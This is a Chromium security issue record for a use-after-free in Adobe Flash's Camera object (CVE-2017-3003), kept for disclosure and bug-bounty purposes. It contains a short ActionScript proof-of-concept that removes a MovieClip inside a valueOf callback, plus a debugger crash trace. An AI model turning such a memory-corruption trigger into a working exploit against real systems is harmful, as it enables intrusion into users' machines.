# Security: Adobe Flash Camera Object Use After Free

| Field | Value |
|-------|-------|
| **Issue ID** | [40086313](https://issues.chromium.org/issues/40086313) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **CVE IDs** | CVE-2017-3003 |
| **Reporter** | xi...@gmail.com |
| **Assignee** | na...@google.com |
| **Created** | 2016-12-23 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

Adobe Flash Camera Object Use After Free

**VERSION**  

Chrome Version: 56.0.2924.28 beta (64-bit)  

Operating System: Windows 7 en 64-bit

**REPRODUCTION CASE**

Open "TestCamera.html.html" with chrome.  

When the camera settings dialog pops up, click "deny" button, then observe chrome crash.

This is a use after free bug when using the camera object.

The function ASnative(2107, 0) takes a number parameter, if we pass in an object with valueOf callback function and removes the  

MovieClip in the callback function, a use-after-free occurs:

var my\_cam:Camera = Camera.get();  

var my\_video:Video = display.video;

var mc:MovieClip = \_root.createEmptyMovieClip("mc", \_root.getNextHighestDepth());  

mc.func = \_global.ASnative(2107, 0);

my\_video.attachVideo(my\_cam);

my\_cam.onStatus = function(infoObj:Object) {  

if (my\_cam.muted) {

var aaa = mc.func( { valueOf:function() {

```
   mc.removeMovieClip();  
   return -2;  
   }});  
 
}  

```

};

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

(1b1c.1d40): Access violation - code c0000005 (first chance)  

First chance exceptions are reported before any exception handling.  

This exception may be expected and handled.  

\*\*\* ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Users\yuki\AppData\Local\Google\Chrome\User Data\PepperFlash\24.0.0.186\pepflashplayer.dll -  

pepflashplayer!PPP\_ShutdownBroker+0x26edd9:  

000007fe`d43c3569 488b7a50 mov rdi,qword ptr [rdx+50h] ds:00000000`00000050=????????????????  

8:097> k  

Child-SP RetAddr Call Site  

00000000`0019cc50 000007fe`d43beae9 pepflashplayer!PPP\_ShutdownBroker+0x26edd9  

00000000`0019cd20 000007fe`d4364a53 pepflashplayer!PPP\_ShutdownBroker+0x26a359  

00000000`0019cd80 000007fe`d4541c5a pepflashplayer!PPP\_ShutdownBroker+0x2102c3  

00000000`0019cf90 000007fe`d43bf985 pepflashplayer!PPP\_ShutdownBroker+0x3ed4ca  

00000000`0019d740 000007fe`d443597a pepflashplayer!PPP\_ShutdownBroker+0x26b1f5  

00000000`0019d850 000007fe`d43c4422 pepflashplayer!PPP\_ShutdownBroker+0x2e11ea  

00000000`0019d880 000007fe`d43bd8e7 pepflashplayer!PPP\_ShutdownBroker+0x26fc92  

00000000`0019d8d0 000007fe`d43c1d27 pepflashplayer!PPP\_ShutdownBroker+0x269157  

00000000`0019d940 000007fe`d43bd69f pepflashplayer!PPP\_ShutdownBroker+0x26d597  

00000000`0019d9a0 000007fe`d43c4192 pepflashplayer!PPP\_ShutdownBroker+0x268f0f  

00000000`0019d9f0 000007fe`d4364a53 pepflashplayer!PPP\_ShutdownBroker+0x26fa02  

00000000`0019da20 000007fe`d4365a38 pepflashplayer!PPP\_ShutdownBroker+0x2102c3  

00000000`0019dc30 000007fe`d4342d9e pepflashplayer!PPP\_ShutdownBroker+0x2112a8  

00000000`0019dc90 000007fe`d453c000 pepflashplayer!PPP\_ShutdownBroker+0x1ee60e  

00000000`0019dd90 000007fe`d4541a70 pepflashplayer!PPP\_ShutdownBroker+0x3e7870  

00000000`0019de00 000007fe`d430cc79 pepflashplayer!PPP\_ShutdownBroker+0x3ed2e0  

00000000`0019e5b0 000007fe`d431045a pepflashplayer!PPP\_ShutdownBroker+0x1b84e9  

00000000`0019e650 000007fe`d41663ae pepflashplayer!PPP\_ShutdownBroker+0x1bbcca  

00000000`0019e950 000007fe`d416419c pepflashplayer!PPP\_ShutdownBroker+0x11c1e  

00000000`0019e990 000007fe`d4169176 pepflashplayer!PPP\_ShutdownBroker+0xfa0c

Credit:

Please credit "Yuki Chen of Qihoo 360 Vulcan Team" for this bug.

## Attachments

- deleted (application/octet-stream, 0 B)

## Timeline

### aa...@google.com (2016-12-24)

Natalie, can you please file these bugs with Adobe. Thanks!

[Monorail components: Internals>Plugins>Flash]

### aa...@google.com (2016-12-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-12-24)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-26)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-02-13)

[Empty comment from Monorail migration]

### na...@google.com (2017-02-14)

Reported this today

### na...@google.com (2017-02-15)

This is PSIRT-6396

### na...@google.com (2017-03-06)

Yuki, I can't see the PoC anymore, did you delete it? Can you attach it again?

### sh...@chromium.org (2017-03-10)

[Empty comment from Monorail migration]

### na...@google.com (2017-03-10)

This will be fixed in March as CVE-2017-3003.

### xi...@gmail.com (2017-03-28)

Thank you for the status update.
Is it possible for this case to go to reward panel now?

### sh...@chromium.org (2017-04-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-06-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-07-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-09-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-10-18)

[Empty comment from Monorail migration]

### xi...@gmail.com (2017-11-08)

Hello,

Since this vulnerability was fixed in March 2017.
Is it possible for this case to go to reward panel now?

### na...@google.com (2017-11-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-11-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-11-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-11-11)

This bug requires manual review: M63 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), gkihumba@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2017-11-13)

Pls apply appropriate OSs label.

+awhalley@ for M63 merge review.

### aw...@google.com (2017-11-14)

No merge needed for Flash bugs.

### aw...@chromium.org (2017-11-16)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2017-11-16)

Thanks! The VRP panel decided to award $3,000 to this, 676778 and https://crbug.com/chromium/676773!

### aw...@chromium.org (2017-11-16)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-02-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### la...@chromium.org (2021-02-25)

[Empty comment from Monorail migration]

### is...@google.com (2021-02-25)

This issue was migrated from crbug.com/chromium/676778?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086313)*
